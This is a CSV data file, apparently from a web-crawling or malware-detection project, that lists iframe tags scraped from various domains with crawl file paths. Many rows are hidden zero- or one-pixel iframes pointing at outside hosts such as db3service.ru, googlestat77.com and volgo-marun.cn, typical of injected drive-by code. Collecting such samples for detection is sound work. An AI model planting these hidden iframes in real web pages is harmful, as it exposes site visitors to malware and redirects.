index,iframe,domain,filename,,,,,,,,
0,"<iframe frameborder=""0"" height=""0"" src=""http://db3service.ru/in.php?a=QQkFBwQEAAADBgAGEkcJBQcEAQMABQEEDQ=="" width=""0""></iframe>",http://ali59000.free.fr,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_7660_20170729_004127/html_200_20170729_004127.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=alphaxiom.com&amp;pid=9PO755G95""></iframe>",http://alphaxiom.com,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_6565_20170729_004128/html_200_20170729_004128.txt,,,,,,,,
1,"<iframe frameborder=""0"" height=""1"" src=""http://188.165.163.235/index/api.php?sid=9Hbrbj_20O5TRHrR0aFL"" style=""position:absolute;top:-100px;left:9999px"" width=""1""></iframe>",http://armazones.com,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_5119_20170729_004149/html_200_20170729_004149.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=augami.net&amp;pid=9PO755G95""></iframe>",http://augami.net,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_1151_20170729_004150/html_200_20170729_004150.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=czbaoyu.com&amp;pid=9PO755G95""></iframe>",http://www1.czbaoyu.com/?kw=sewing%20machine,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_7975_20170729_004243/html_200_20170729_004243.txt,,,,,,,,
0,"<iframe height=""0"" name=""5924"" src=""http://AAA.77xxmm.cn/new858.htm?075"" width=""0""></iframe>",http://de007.net,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_845_20170729_004252/html_200_20170729_004252.txt,,,,,,,,
1,"<iframe height=""0"" name=""5924"" src=""http://aaa.1l1l1l.com/error/404.html"" width=""0""></iframe>",http://de007.net,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_845_20170729_004252/html_200_20170729_004252.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=douate.com&amp;pid=9PO755G95""></iframe>",http://douate.com,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_6058_20170729_004257/html_200_20170729_004257.txt,,,,,,,,
0,"<iframe height=""0"" src=""http://116.0.103.105/reflinks/"" width=""0""></iframe>",http://globalnursesonline.com,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_3229_20170729_004312/html_200_20170729_004312.txt,,,,,,,,
0,"<iframe height=""1"" src=""http://googlestat77.com/"" style=""visibility:hidden;"" width=""1""></iframe>",http://greenculturefoundation.org,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_8367_20170729_004315/html_200_20170729_004315.txt,,,,,,,,
1,"<iframe height=""1"" src=""http://visions7.net/"" style=""visibility:hidden;"" width=""1""></iframe>",http://greenculturefoundation.org,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_8367_20170729_004315/html_200_20170729_004315.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=gumblar.cn&amp;pid=9PO755G95""></iframe>",http://gumblar.cn,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_1423_20170729_004317/html_200_20170729_004317.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=mainnetsoll.com&amp;pid=9PO755G95""></iframe>",http://mainnetsoll.com,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_2962_20170729_004402/html_200_20170729_004402.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=microsearchstat.com&amp;pid=9PO755G95""></iframe>",http://microsearchstat.com,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_6210_20170729_004415/html_200_20170729_004415.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=natebennettfleming.com&amp;pid=9PO755G95""></iframe>",http://natebennettfleming.com,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_1559_20170729_004435/html_200_20170729_004435.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=se-group.de&amp;pid=9PO755G95""></iframe>",http://se-group.de,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_5749_20170729_004524/html_200_20170729_004524.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=sockslab.net&amp;pid=9PO755G95""></iframe>",http://sockslab.net,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_7232_20170729_004534/html_200_20170729_004534.txt,,,,,,,,
0,"<iframe height=""1"" src=""http://volgo-marun.cn/pek/index.php"" style=""visibility: hidden;"" width=""1""></iframe>",http://soluxury.co.uk,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_4814_20170729_004535/html_200_20170729_004535.txt,,,,,,,,
0,"<iframe height=""10"" src=""http://jedelcio.com.br/counter.php"" style=""visibility: hidden; position: absolute; left: 0px; top: 0px"" width=""10""></iframe>",http://yeniyuzyillions.org,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_7870_20170729_004627/html_200_20170729_004627.txt,,,,,,,,
